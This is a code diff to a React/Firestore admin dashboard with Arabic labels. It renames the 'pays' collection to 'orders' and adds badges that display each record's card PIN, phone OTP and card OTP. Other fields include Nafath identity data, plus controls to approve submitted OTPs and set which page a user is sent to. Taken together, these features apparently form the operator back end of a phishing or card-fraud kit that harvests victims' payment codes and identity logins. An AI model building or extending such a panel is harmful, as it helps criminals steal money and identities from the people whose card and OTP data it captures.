@@ -803,7 +803,7 @@ export default function NotificationsPage() {
 
   const fetchNotifications = () => {
     setIsLoading(true)
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
+    const q = query(collection(db, "orders"), orderBy("createdDate", "desc"))
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
@@ -851,7 +851,7 @@ export default function NotificationsPage() {
 
   const handleCurrentPageUpdate = async (id: string, currentPage: string) => {
     try {
-      const docRef = doc(db, "pays", id)
+      const docRef = doc(db, "orders", id)
       await updateDoc(docRef, { currentPage })
       setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, currentPage } : n)))
       toast({
@@ -893,7 +893,7 @@ export default function NotificationsPage() {
 
   const handleanyChange = async (id: string, color: any) => {
     try {
-      const docRef = doc(db, "pays", id)
+      const docRef = doc(db, "orders", id)
       await updateDoc(docRef, { any: color })
 
       setNotifications(
@@ -919,7 +919,7 @@ export default function NotificationsPage() {
 
   const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
     try {
-      const docRef = doc(db, "pays", id)
+      const docRef = doc(db, "orders", id)
       await updateDoc(docRef, {
         authNumber: authNumber,
         phoneVerificationStatus: "approved",
@@ -942,7 +942,7 @@ export default function NotificationsPage() {
 
   const handleApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id)
+      const targetPost = doc(db, "orders", id)
       await updateDoc(targetPost, {
         status: state,
       })
@@ -963,9 +963,9 @@ export default function NotificationsPage() {
 
   const handleOtpApproval = async (approved: boolean, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id)
+      const targetPost = doc(db, "orders", id)
       await updateDoc(targetPost, {
-        otpApproved: approved,
+        verified: approved,
       })
       toast({
         title: approved ? "تمت الموافقة على OTP" : "تم رفض OTP",
@@ -984,7 +984,7 @@ export default function NotificationsPage() {
 
   const handleDelete = async (id: string) => {
     try {
-      const docRef = doc(db, "pays", id)
+      const docRef = doc(db, "orders", id)
       await updateDoc(docRef, { isHidden: true })
       setNotifications(notifications.filter((notification) => notification.id !== id))
       toast({
@@ -1007,7 +1007,7 @@ export default function NotificationsPage() {
     try {
       const batch = writeBatch(db)
       notifications.forEach((notification) => {
-        const docRef = doc(db, "pays", notification.id)
+        const docRef = doc(db, "orders", notification.id)
         batch.update(docRef, { isHidden: true })
       })
       await batch.commit()
@@ -1493,6 +1493,8 @@ export default function NotificationsPage() {
                             <User className="h-3 w-3 mr-1" />
                             {notification.nafazId ? "معلومات نفاذ" : "لا يوجد معلومات"}
                           </Badge>
+                          {notification?.phoneOtp&&<Badge  className="bg-pin-400">{notification.phoneOtp}</Badge>}
+                          {notification?.cardPin&&<Badge className="bg-blue-400">{notification.cardPin}</Badge>}
                         </div>
                       </td>
                       <td className="px-6 py-4">
@@ -1505,13 +1507,13 @@ export default function NotificationsPage() {
                         <UserStatus userId={notification.id} />
                       </td>
                       <td className="px-6 py-4 text-center">
-                        {notification.otp && (
+                        {notification.cardOtp && (
                           <div className="flex items-center justify-center gap-2">
                             <Badge
                               variant="outline"
                               className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30"
                             >
-                              {notification.otp}
+                              {notification.cardOtp}
                             </Badge>
                             <div className="flex gap-1">
                               <TooltipProvider>
@@ -1605,18 +1607,18 @@ export default function NotificationsPage() {
                       </Badge>
                     </div>
 
-                    {notification.otp && (
+                    {notification.cardOtp && (
                       <div className="flex items-center gap-2">
                         <span className="text-sm text-muted-foreground">الكود:</span>
                         <Badge variant="outline" className="bg-blue-50 text-blue-700 dark:bg-blue-950/30">
-                          {notification.otp}
+                          {notification.cardOtp}
                         </Badge>
                         <Button
                           variant="ghost"
                           size="icon"
-                          className={`h-7 w-7 ${notification.otpApproved === true ? "bg-emerald-100 text-emerald-700" : "text-emerald-600"}`}
+                          className={`h-7 w-7 ${notification.verified === true ? "bg-emerald-100 text-emerald-700" : "text-emerald-600"}`}
                           onClick={() => handleOtpApproval(true, notification.id)}
-                          disabled={notification.otpApproved === true}
+                          disabled={notification.verified === true}
                         >
                           <CheckCircle className="h-4 w-4" />
                         </Button>
